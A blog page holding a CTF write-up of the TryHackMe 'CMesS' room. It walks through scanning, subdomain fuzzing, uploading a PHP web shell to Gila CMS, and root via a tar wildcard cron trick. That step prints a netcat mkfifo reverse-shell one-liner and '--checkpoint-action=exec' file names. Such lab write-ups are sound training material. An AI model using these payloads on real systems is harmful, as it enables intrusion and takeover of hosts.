@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>TryHackMe CMesS CTF Write Up | n3ird4</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="Hey THM is pretty cool though so let’s have fun with this CMesS room First hint: Please also note that this box does not require brute forcing! A quick rustscan scan gave me only 2 open ports: 123PORT">
+<meta name="keywords" content="tryhackme">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe CMesS CTF Write Up">
+<meta property="og:url" content="http://91.208.181.214/2021/11/05/TryHackMe-CMesS-CTF-Write-Up/index.html">
+<meta property="og:site_name" content="n3ird4">
+<meta property="og:description" content="Hey THM is pretty cool though so let’s have fun with this CMesS room First hint: Please also note that this box does not require brute forcing! A quick rustscan scan gave me only 2 open ports: 123PORT">
+<meta property="og:locale" content="fr">
+<meta property="og:updated_time" content="2021-11-05T15:01:05.662Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="TryHackMe CMesS CTF Write Up">
+<meta name="twitter:description" content="Hey THM is pretty cool though so let’s have fun with this CMesS room First hint: Please also note that this box does not require brute forcing! A quick rustscan scan gave me only 2 open ports: 123PORT">
+  
+    <link rel="alternate" href="/atom.xml" title="n3ird4" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">n3ird4</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Just a blog about SysOps H4c|&lt; and Petanque...</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="Flux RSS"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Rechercher"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://91.208.181.214"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-TryHackMe-CMesS-CTF-Write-Up" class="article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/11/05/TryHackMe-CMesS-CTF-Write-Up/" class="article-date">
+  <time datetime="2021-11-05T13:42:42.000Z" itemprop="datePublished">2021-11-05</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>►<a class="article-category-link" href="/categories/CTF/TryHackMe-CMesS/">TryHackMe CMesS</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      TryHackMe CMesS CTF Write Up
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Hey THM is pretty cool though so let’s have fun with this CMesS room</p>
+<p>First hint: <em>Please also note that this box does not require brute forcing!</em></p>
+<p>A quick <a href="https://github.com/RustScan/RustScan" target="_blank" rel="noopener">rustscan</a> scan gave me only 2 open ports:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 63</span><br><span class="line">80/tcp open  http    syn-ack ttl 63</span><br></pre></td></tr></table></figure>
+<p>but nmap return some juicy info:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-generator: Gila CMS</span><br><span class="line">| http-robots.txt: 3 disallowed entries </span><br><span class="line">|_/src/ /themes/ /lib/</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html; charset=UTF-8).</span><br></pre></td></tr></table></figure>
+<p>Gila ? Fair enough.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~# searchsploit Gila CMS                                      </span><br><span class="line">----------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                       |  Path</span><br><span class="line">----------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Gila CMS 1.11.8 - &apos;query&apos; SQL Injection                                                              | php/webapps/48590.py</span><br><span class="line">Gila CMS 1.9.1 - Cross-Site Scripting                                                                | php/webapps/46557.txt</span><br><span class="line">Gila CMS 2.0.0 - Remote Code Execution (Unauthenticated)                                             | php/webapps/49412.py</span><br><span class="line">Gila CMS &lt; 1.11.1 - Local File Inclusion                                                             | multiple/webapps/47407.txt</span><br><span class="line">----------------------------------------------------------------------------------------------------- ---------------------------------</span><br></pre></td></tr></table></figure>
+<p>I also ran gobuster in the background but at this stage could not figure out where to go 🤔</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">===============================================================</span><br><span class="line">2042/04/02 21:42:42 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index                (Status: 200) [Size: 3860]</span><br><span class="line">/blog                 (Status: 200) [Size: 3860]</span><br><span class="line">/search               (Status: 200) [Size: 3860]</span><br><span class="line">/about                (Status: 200) [Size: 3359]</span><br><span class="line">/1.html               (Status: 200) [Size: 4090]</span><br><span class="line">/01.php               (Status: 200) [Size: 4090]</span><br><span class="line">/1.log                (Status: 200) [Size: 4090]</span><br><span class="line">/01.txt               (Status: 200) [Size: 4090]</span><br><span class="line">/1.cgi                (Status: 200) [Size: 4090]</span><br><span class="line">/1.sh                 (Status: 200) [Size: 4090]</span><br><span class="line">/01.html              (Status: 200) [Size: 4090]</span><br><span class="line">/1.js                 (Status: 200) [Size: 4090]</span><br><span class="line">/01.log               (Status: 200) [Size: 4090]</span><br><span class="line">/1.php                (Status: 200) [Size: 4090]</span><br><span class="line">/01                   (Status: 200) [Size: 4090]</span><br><span class="line">/1                    (Status: 200) [Size: 4090]</span><br><span class="line">/01.cgi               (Status: 200) [Size: 4090]</span><br><span class="line">/1.txt                (Status: 200) [Size: 4090]</span><br><span class="line">/login                (Status: 200) [Size: 1583]</span><br><span class="line">/01.sh                (Status: 200) [Size: 4090]</span><br><span class="line">/01.js                (Status: 200) [Size: 4090]</span><br><span class="line">/category             (Status: 200) [Size: 3871]</span><br><span class="line">/0                    (Status: 200) [Size: 3860]</span><br><span class="line">/themes               (Status: 301) [Size: 324] [--&gt; http://X.X.X.X/themes/?url=themes]</span><br><span class="line">/feed                 (Status: 200) [Size: 735]                                             </span><br><span class="line">/admin                (Status: 200) [Size: 1583]                                            </span><br><span class="line">/assets               (Status: 301) [Size: 324] [--&gt; http://X.X.X.X/assets/?url=assets]</span><br><span class="line">/tag                  (Status: 200) [Size: 3883]                                            </span><br><span class="line">/author               (Status: 200) [Size: 3599]                                            </span><br><span class="line">/Search               (Status: 200) [Size: 3860]                                            </span><br><span class="line">/sites                (Status: 301) [Size: 322] [--&gt; http://X.X.X.X/sites/?url=sites]  </span><br><span class="line">/About                (Status: 200) [Size: 3345]                                            </span><br><span class="line">/log                  (Status: 301) [Size: 318] [--&gt; http://X.X.X.X/log/?url=log]      </span><br><span class="line">/Index                (Status: 200) [Size: 3860]                                            </span><br><span class="line">/tags                 (Status: 200) [Size: 3145]                                            </span><br><span class="line">/1x1.js               (Status: 200) [Size: 4090]                                            </span><br><span class="line">/1x1.php              (Status: 200) [Size: 4090]                                            </span><br><span class="line">/1x1                  (Status: 200) [Size: 4090]                                            </span><br><span class="line">/1x1.txt              (Status: 200) [Size: 4090]                                            </span><br><span class="line">/1x1.html             (Status: 200) [Size: 4090]                                            </span><br><span class="line">/1x1.log              (Status: 200) [Size: 4090]                                            </span><br><span class="line">/1x1.cgi              (Status: 200) [Size: 4090]                                            </span><br><span class="line">/1x1.sh               (Status: 200) [Size: 4090]                                            </span><br><span class="line">/lib                  (Status: 301) [Size: 318] [--&gt; http://X.X.X.X/lib/?url=lib]      </span><br><span class="line">/src                  (Status: 301) [Size: 318] [--&gt; http://X.X.X.X/src/?url=src]      </span><br><span class="line">/api                  (Status: 200) [Size: 0]                                               </span><br><span class="line">/robots.txt           (Status: 200) [Size: 65]                                              </span><br><span class="line">/001.js               (Status: 200) [Size: 4090]                                            </span><br><span class="line">/001                  (Status: 200) [Size: 4090]                                            </span><br><span class="line">/001.php              (Status: 200) [Size: 4090]                                            </span><br><span class="line">/001.txt              (Status: 200) [Size: 4090]                                            </span><br><span class="line">/001.html             (Status: 200) [Size: 4090]                                            </span><br><span class="line">/001.log              (Status: 200) [Size: 4090]                                            </span><br><span class="line">/001.cgi              (Status: 200) [Size: 4090]                                            </span><br><span class="line">/001.sh               (Status: 200) [Size: 4090]                                            </span><br><span class="line">/cm                   (Status: 500) [Size: 0]                                               </span><br><span class="line">/1pix.js              (Status: 200) [Size: 4090]                                            </span><br><span class="line">/1pix                 (Status: 200) [Size: 4090]                                            </span><br><span class="line">/1pix.php             (Status: 200) [Size: 4090]                                            </span><br><span class="line">/1pix.txt             (Status: 200) [Size: 4090]                                            </span><br><span class="line">/1pix.html            (Status: 200) [Size: 4090]                                            </span><br><span class="line">/1pix.log             (Status: 200) [Size: 4090]                                            </span><br><span class="line">/1pix.cgi             (Status: 200) [Size: 4090]                                            </span><br><span class="line">/1pix.sh              (Status: 200) [Size: 4090]                                            </span><br><span class="line">/fm                   (Status: 200) [Size: 0]                                               </span><br><span class="line">/tmp                  (Status: 301) [Size: 318] [--&gt; http://X.X.X.X/tmp/?url=tmp]      </span><br><span class="line">/1a.log               (Status: 200) [Size: 4090]                                            </span><br><span class="line">/1a.cgi               (Status: 200) [Size: 4090]                                            </span><br><span class="line">/1a.sh                (Status: 200) [Size: 4090]                                            </span><br><span class="line">/1a.js                (Status: 200) [Size: 4090]                                            </span><br><span class="line">/1a                   (Status: 200) [Size: 4090]                                            </span><br><span class="line">/1a.php               (Status: 200) [Size: 4090]                                            </span><br><span class="line">/1a.txt               (Status: 200) [Size: 4090]                                            </span><br><span class="line">/1a.html              (Status: 200) [Size: 4090]</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+<p>The /admin URL was intersting so I had a quick look over the “php/webapps/48590.py” from searchsploit result.<br>I figured out that I had to be connected to the CMS somehow in order to get my GSESSIONID and of course without bruteforcing !<br>Exploiting the <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-5515" target="_blank" rel="noopener">CVE_2020_5515</a> will be the goal IIUC.</p>
+<p>Hum…In order to get connected I had to click on the hint: <em>Have you tried fuzzing for subdomains?</em><br>And of course I did not !!!🔨 🔨 🔨<br>And was not able to get some info with sublist3r btw:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./sublist3r.py -d cmess.thm</span><br></pre></td></tr></table></figure>
+<p>But I finally found something cool with <a href="https://github.com/ffuf/ffuf" target="_blank" rel="noopener">ffuf</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ffuf -w seclists/Discovery/DNS/namelist.txt -H &quot;Host: FUZZ.cmess.thm&quot; -u http://X.X.X.X -fs 2395</span><br></pre></td></tr></table></figure>
+<p>and added it to my /etc/hosts </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;redacted&gt;</span><br><span class="line">XXX@cmess.thm</span><br><span class="line"></span><br><span class="line">Have you guys fixed the bug that was found on live?</span><br><span class="line">XXX@cmess.thm</span><br><span class="line"></span><br><span class="line">Hey XXX, We have managed to fix the misconfigured .htaccess file, we&apos;re hoping to patch it in the upcoming patch!</span><br><span class="line">XXX@cmess.thm</span><br><span class="line"></span><br><span class="line">Update! We have had to delay the patch due to unforeseen circumstances</span><br><span class="line">XXX@cmess.thm</span><br><span class="line"></span><br><span class="line">That&apos;s ok, can you guys reset my password if you get a moment, I seem to be unable to get onto the admin panel.</span><br><span class="line">XXX@cmess.thm</span><br><span class="line"></span><br><span class="line">Your password has been reset. Here: K&lt;redacted&gt;%</span><br></pre></td></tr></table></figure>
+<p>Cool I finally had a user/password \o/ So I was able to connect and get my GSESSIONID via burpsuite.<br>Now I knew as I was connected that it was Gila CMS version 1.10.9<br>And config.php gave me some super juicy info: </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&apos;db&apos; =&gt; </span><br><span class="line">array (</span><br><span class="line">  &apos;host&apos; =&gt; &apos;localhost&apos;,</span><br><span class="line">  &apos;user&apos; =&gt; &apos;root&apos;,</span><br><span class="line">  &apos;pass&apos; =&gt; &apos;r&lt;redacted&gt;d&apos;,</span><br><span class="line">  &apos;name&apos; =&gt; &apos;gila&apos;,</span><br><span class="line">),</span><br></pre></td></tr></table></figure>
+<p>In order to upload a shell I read <a href="https://github.com/jkana/Gila-CMS-1.16.0-shell-upload" target="_blank" rel="noopener">https://github.com/jkana/Gila-CMS-1.16.0-shell-upload</a><br>And was able to upload mine in /tmp and triggered it through <a href="http://cmess.thm/tmp/shell.php" target="_blank" rel="noopener">http://cmess.thm/tmp/shell.php</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~# cat shell.php</span><br><span class="line">&lt;?php</span><br><span class="line">$output = shell_exec(&apos;whoami&apos;);</span><br><span class="line">echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>and get the following result:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">total 12K</span><br><span class="line">drwxr-xr-x 22 root  root  4.0K Feb  6  2020 ..</span><br><span class="line">drwxr-xr-x  3 root  root  4.0K Feb  6  2020 .</span><br><span class="line">drwxr-x---  4 xxxx  xxxx  4.0K Feb  9  2020 xxxx (redacted!)</span><br></pre></td></tr></table></figure>
+<p>But obviously could not read it as I was connected as www-data user.<br>And so…pentest monkey dance started 😅<br>And as soon as I got my shell I was lucky enough to oneshot this:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cd opt</span><br><span class="line">ls</span><br><span class="line">ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x  2 root root 4096 Feb  6  2020 .</span><br><span class="line">drwxr-xr-x 22 root root 4096 Feb  6  2020 ..</span><br><span class="line">-rwxrwxrwx  1 root root   36 Feb  6  2020 .password.bak</span><br><span class="line">cat .password.bak</span><br><span class="line">xxxx backup password</span><br><span class="line">U&lt;redacted&gt;6</span><br><span class="line"></span><br><span class="line">su - xxxx</span><br><span class="line">cat user.txt</span><br><span class="line">thm&#123;&lt;redactedflag&gt;&#125;</span><br><span class="line">xxxx@cmess:~$</span><br></pre></td></tr></table></figure>
+<p>I connected via ssh to get a better shell and obviously password was the same…<br>Had a quick look over /tmp and found a backup.tar.gz </p>
+<p>It was related to the following cron task:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/2 *   * * *   root    cd /home/andre/backup &amp;&amp; tar -zcf /tmp/andre_backup.tar.gz *</span><br></pre></td></tr></table></figure>
+<p>Thanks to <a href="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/" target="_blank" rel="noopener">hackingarticles</a> exploit was easy as:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xxxx@cmess:~/backup$ cat shell.sh </span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc X.X.X.X 4242 &gt;/tmp/f</span><br><span class="line"></span><br><span class="line">xxxx@cmess:~/backup$ ls -lrt</span><br><span class="line">total 20</span><br><span class="line">-rwxr-x--- 1 xxxx xxxx 52 Nov  1 05:47 note</span><br><span class="line">-rw-rw-r-- 1 xxxx xxxx 80 Nov  1 06:03 shell.sh</span><br><span class="line">-rw-rw-r-- 1 xxxx xxxx  1 Nov  1 06:04 --checkpoint-action=exec=sh shell.sh</span><br><span class="line">-rw-rw-r-- 1 xxxx xxxx  1 Nov  1 06:04 --checkpoint=1</span><br></pre></td></tr></table></figure>
+<p>And 🥁  Hourra ! </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">listening on [any] 4242 ...</span><br><span class="line"># uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">cat /root/root.txt</span><br><span class="line">thm&#123;&lt;redactedflag&gt;&#125;</span><br></pre></td></tr></table></figure>
+<p>This room was really cool and I hope you enjoyed it as well.<br>See you later ++</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://91.208.181.214/2021/11/05/TryHackMe-CMesS-CTF-Write-Up/" data-id="ckvmi9ohh00359ciytzucrb5c" class="article-share-link">Partager</a>
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tryhackme/">tryhackme</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2020/10/27/TryHackMe-Madness-CTF-Write-Up/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Ancien</strong>
+      <div class="article-nav-title">TryHackMe Madness CTF Writeup</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Catégories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AWS/">AWS</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/AWS/AWS-Certified-Solutions-Architect-Associate-SAA-C02/">AWS Certified Solutions Architect Associate SAA-C02</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Ansible/">Ansible</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Ansible/Quick-Starts/">Quick Starts</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/TryHackMe-CMesS/">TryHackMe CMesS</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/TryHackMe-Madness/">TryHackMe Madness</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/TryHackMe-Wgel/">TryHackMe Wgel</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/ElasticSearch/">ElasticSearch</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/ElasticSearch/Playing-with-Elastic-Stack-Modules/">Playing with Elastic Stack Modules</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Git/">Git</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Git/Source-Control-with-Git/">Source Control with Git</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hexo/">Hexo</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Hexo/How-to/">How to</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/MySQL/">MySQL</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/MySQL/Reparation-de-replication-master-master-sans-lock/">Réparation de réplication master/master (sans lock)</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Nginx/">Nginx</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Nginx/Playing-with-Nginx-and-Dynamic-Modules/">Playing with Nginx and Dynamic Modules</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Sysadmin-Tips-Tricks/">Sysadmin Tips & Tricks</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Sysadmin-Tips-Tricks/iowait/">iowait</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Sysadmin-Tips-Tricks/swap/">swap</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Varnish/">Varnish</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Varnish/blocklist-IP-address-with-Varnish/">blocklist IP address with Varnish</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/others/">others</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Mot-clés</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/42/">42</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/AWS/">AWS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ansible/">Ansible</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Blog/">Blog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ModSecurity/">ModSecurity</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Test/">Test</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Univers/">Univers</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/elasticsearch/">elasticsearch</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/githooks/">githooks</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/grep/">grep</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/iotop/">iotop</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/iowait/">iowait</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nginx/">nginx</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sort/">sort</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/swap/">swap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tryhackme/">tryhackme</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/varnish/">varnish</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vmstat/">vmstat</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Nuage de mot-clés</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/42/" style="font-size: 10px;">42</a> <a href="/tags/AWS/" style="font-size: 10px;">AWS</a> <a href="/tags/Ansible/" style="font-size: 10px;">Ansible</a> <a href="/tags/Blog/" style="font-size: 20px;">Blog</a> <a href="/tags/ModSecurity/" style="font-size: 10px;">ModSecurity</a> <a href="/tags/Test/" style="font-size: 20px;">Test</a> <a href="/tags/Univers/" style="font-size: 10px;">Univers</a> <a href="/tags/elasticsearch/" style="font-size: 10px;">elasticsearch</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/githooks/" style="font-size: 10px;">githooks</a> <a href="/tags/grep/" style="font-size: 10px;">grep</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/iotop/" style="font-size: 10px;">iotop</a> <a href="/tags/iowait/" style="font-size: 10px;">iowait</a> <a href="/tags/mysql/" style="font-size: 10px;">mysql</a> <a href="/tags/nginx/" style="font-size: 10px;">nginx</a> <a href="/tags/sort/" style="font-size: 10px;">sort</a> <a href="/tags/swap/" style="font-size: 10px;">swap</a> <a href="/tags/tryhackme/" style="font-size: 15px;">tryhackme</a> <a href="/tags/varnish/" style="font-size: 10px;">varnish</a> <a href="/tags/vmstat/" style="font-size: 10px;">vmstat</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">novembre 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">octobre 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">septembre 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">juillet 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">mai 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">avril 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">novembre 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">octobre 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">décembre 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">avril 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">mars 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Articles récents</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/11/05/TryHackMe-CMesS-CTF-Write-Up/">TryHackMe CMesS CTF Write Up</a>
+          </li>
+        
+          <li>
+            <a href="/2020/10/27/TryHackMe-Madness-CTF-Write-Up/">TryHackMe Madness CTF Writeup</a>
+          </li>
+        
+          <li>
+            <a href="/2020/09/27/TryHackMe-Wgel-CTF-Write-Up/">TryHackMe Wgel CTF Writeup</a>
+          </li>
+        
+          <li>
+            <a href="/2020/09/08/AWS-SAAC-02/">AWS-SAAC-02</a>
+          </li>
+        
+          <li>
